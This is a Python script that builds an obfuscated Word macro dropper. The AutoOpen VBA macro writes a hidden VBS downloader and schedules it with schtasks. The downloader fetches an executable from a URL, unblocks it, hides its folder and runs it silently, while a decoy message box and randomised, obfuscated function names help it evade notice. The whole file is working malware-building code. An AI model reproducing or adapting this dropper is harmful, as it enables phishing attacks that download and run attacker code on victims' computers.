import string
import random

DIRECTORY   = 'C:\\Users\\user\\Desktop\\TEST\\'     # "C:\\Users\\Public\\Agent\\" 
PYL_URL     = 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe'
AGENT_NAME  = 'test.exe'
SCRIPT_NAME = 'wget.vbs'
TASK_NAME   = 'AGENT'



# Random names for vba functions
RND_coverture       = ''.join(random.choice(string.ascii_uppercase) for _ in range(10)) # + string.digits
RND_Worker          = ''.join(random.choice(string.ascii_uppercase) for _ in range(10)) # + string.digits
RND_BuildFullPath   = ''.join(random.choice(string.ascii_uppercase) for _ in range(10)) # + string.digits

vbs = '''
'------------------------------------------------------------
' Init

On Error Resume Next

Sub BuildFullPath(ByVal FullPath)
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(FullPath) Then
    BuildFullPath fso.GetParentFolderName(FullPath)
    fso.CreateFolder FullPath
    End If
End Sub

BuildFullPath "''' + DIRECTORY + '''"

'------------------------------------------------------------
' Variables

strDirectory = "''' + DIRECTORY + '''"
strUrl = "''' + PYL_URL + '''"
strFile = "''' + DIRECTORY + AGENT_NAME + '''"
strTask = "''' + TASK_NAME + '''"


URL = strUrl
saveTo = strFile

'if WScript.Arguments.Count < 1 then
'  MsgBox "Usage: wget.vbs <url> (file)"
'  WScript.Quit
'end if

'URL = WScript.Arguments(0)
'if WScript.Arguments.Count > 1 then
'  saveTo = WScript.Arguments(1)"
'else
'  parts = split(url,"/")
'  saveTo = parts(ubound(parts))
'end if


'------------------------------------------------------------
' Wget

Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")

objXMLHTTP.open "GET", URL, false
objXMLHTTP.send()

If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1 'adTypeBinary

objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position = 0    'Set the stream position to the start

Set objFSO = Createobject("Scripting.FileSystemObject")
If objFSO.Fileexists(saveTo) Then objFSO.DeleteFile saveTo
Set objFSO = Nothing

objADOStream.SaveToFile saveTo
objADOStream.Close
Set objADOStream = Nothing
End if

Set objXMLHTTP = Nothing



'------------------------------------------------------------
' Execute

Set oShell = CreateObject ("Wscript.Shell")
Dim cmd1
Dim cmd2
Dim cmd3
Dim cmd4
Dim cmd5

cmd1 = "powershell.exe -noprofile -command unblock-file -path " & strFile
oShell.Run cmd1, 0, false

cmd2 = "attrib +S +H +I /S /D " & Left(strDirectory, Len(strDirectory) - 1)
oShell.Run cmd2, 0, False

cmd3 = "attrib +S +H +I /S /D " & strDirectory & "*"
oShell.Run cmd3, 0, False

cmd4 = strFile
oShell.Run cmd4, 0, false

cmd5 = "schtasks /delete /TN " & strTask & " /F"
oShell.Run cmd5, 0, false


' Done
WScript.Quit


'''



vba_1 = '''
Sub AutoOpen()

    ''' + RND_Worker + '''
    ''' + RND_coverture + '''
    
End Sub

Sub ''' + RND_coverture + '''()
    
    MsgBox "DONE"
    
End Sub


Sub BuildFullPath(ByVal FullPath)
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FolderExists(FullPath) Then
    BuildFullPath fso.GetParentFolderName(FullPath)
    fso.CreateFolder FullPath
    End If
End Sub


Sub ''' + RND_Worker + '''()

'--------------------------------------------------------------------------------
' SET variables    

    Dim DIRECTORY As String
    Dim PYL_URL As String
    Dim AGENT_NAME As String
    Dim SCRIPT_NAME As String
    Dim TASK_NAME As String

    DIRECTORY = "''' + DIRECTORY + '''"
    PYL_URL = "''' + PYL_URL + '''"
    AGENT_NAME = "''' + AGENT_NAME + '''"
    SCRIPT_NAME = "''' + SCRIPT_NAME + '''"
    TASK_NAME = "''' + TASK_NAME + '''"

'--------------------------------------------------------------------------------
' Create Directory    

    On Error Resume Next
    MkDir (DIRECTORY)

    BuildFullPath DIRECTORY

'--------------------------------------------------------------------------------
' Build script

    Dim fso1 As Object
    Set fso1 = CreateObject("Scripting.FileSystemObject")
    Dim oFile1 As Object
    Set oFile1 = fso1.CreateTextFile( DIRECTORY & SCRIPT_NAME)


'''


vba_2 = '''


    oFile1.Close
    Set fso1 = Nothing
    Set oFile1 = Nothing


'--------------------------------------------------------------------------------
' Creating cronjob

    
    Dim shiftedDate As Date
    Dim shiftedHour As String
    Dim shiftedMinute As String
    Dim runTime As String
    
    shiftedDate = DateAdd("n", 2, Now())
    shiftedHour = Format(shiftedDate, "hh")
    shiftedMinute = Format(shiftedDate, "nn")
    runTime = shiftedHour & ":" & shiftedMinute

    Set oShell = CreateObject("Wscript.Shell")
    Dim command1
    Dim command2
    Dim command3
    Dim command4
    Dim command5

    command1 = "schtasks /delete /TN " & TASK_NAME & " /F"
    oShell.Run command1, 0, False

    command2 = "schtasks /create /SC ONCE /TN " & TASK_NAME & " /TR " & DIRECTORY & SCRIPT_NAME & " /ST " & runTime & " /F"
    oShell.Run command2, 0, False

    command3 = "attrib +S +H +I /S /D " & Left(DIRECTORY, Len(DIRECTORY) - 1)
    oShell.Run command3, 0, False

    command4 = "attrib +S +H +I /S /D " & strDirectory & "*"
    oShell.Run command4, 0, False

    command5 = "powershell.exe -noprofile -command unblock-file -path " & DIRECTORY & SCRIPT_NAME
    oShell.Run command5, 0, False

    'schtasks /query /TN AGENT

End Sub

'''

import subprocess
import os

try:
    os.remove ('plain_vbs.txt')
    os.remove ('obfuscated_vbs.txt')
    os.remove ('plain_vba.txt')
    os.remove ('obfuscated_vba.txt')
except:
    pass

##########################################################################################

vbs_obfuscator_name = 'vbs_obfuscator.py'       # Usage: python vbs_obfuscator.py inFile.vbs outFile.vbs
vba_obfuscator_name = 'vba_obfuscator_ex.py'    # Usage: python vba_obfuscator.py inFile.vba outFile.vba
max_line_lenght = 128


# Writing plain vbs
f = open('plain_vbs.txt', 'w')
f.write(vbs)
f.close()


# Obfuscating plain vbs
subprocess.call ( ['python', vbs_obfuscator_name, 'plain_vbs.txt', 'obfuscated_vbs.txt'])


# Reading obfuscated vbs
f = open('obfuscated_vbs.txt', 'r') 
OBF_vbs = f.read()
f.close()



# DEPRECATED
'''
# Insert obfuscated vbs in plain vba
f = open('plain_vba.txt', 'w')
f.write(vba_1)

for l in OBF_vbs.split("\n"):

    if len (l) < max_line_lenght:
        f.write( '    oFile1.WriteLine \"' + l.replace('\"', '\" & Chr(34) & \"') + '[!!]\"' + '\n')
    
    else:
        n = max_line_lenght
        splitted = [l[i:i+n] for i in range(0, len(l), n)]

        for s in splitted:
            f.write( '    oFile1.Write \"' + s.replace('\"', '\" & Chr(34) & \"') + '[!!]\"' +'\n')
        f.write( '    oFile1.WriteLine \"[!!]\"' + '\n')

f.write(vba_2)
f.close()
'''


# Insert obfuscated vbs in plain vba
f = open('plain_vba.txt', 'w')
f.write(vba_1)

for l in OBF_vbs.split("\n"):

    if len (l) < max_line_lenght:
        f.write( '    oFile1.WriteLine \"' + l.replace('\"', '[!!]\" & Chr(34) & \"') + '[!!]\"' + '\n')
    
    else:
        n = max_line_lenght
        splitted = [l[i:i+n] for i in range(0, len(l), n)]

        for s in splitted:
            f.write( '    oFile1.Write \"' + s.replace('\"', '[!!]\" & Chr(34) & \"') + '[!!]\"' +'\n')
        f.write( '    oFile1.WriteLine \"[!!]\"' + '\n')

f.write(vba_2)
f.close()


##########################################################################################

# Function to check the presence of ASCII character
def is_ascii(s):

    unallowed = [
                    0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 14, 15, 16, 17, 
                    18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31
                ]

    for a in unallowed:
        check = all( a != ord(c) < 127 for c in s )

        if check == False:
            return False

    if check:
        return True

##########################################################################################

build_status = False
while build_status == False:

    # Obfuscating plain vba
    subprocess.call ( ['python', vba_obfuscator_name, 'plain_vba.txt', 'obfuscated_vba.txt'])


    # Check for control ASCII character in obfuscated vba
    f = open('obfuscated_vba.txt', 'r') 
    OBF_vba = f.read()
    f.close()

    build_status = is_ascii (OBF_vba)

    if build_status == False:
        raw_input ("[!] Found control ASCII character. Press enter to retry...")
    
    else:
        print "[*] ALL GOOD, cleaning up..."

##########################################################################################

try:
    os.remove ('plain_vbs.txt')
    os.remove ('obfuscated_vbs.txt')
    os.remove ('plain_vba.txt')
    #os.remove ('obfuscated_vba.txt')
except:
    pass

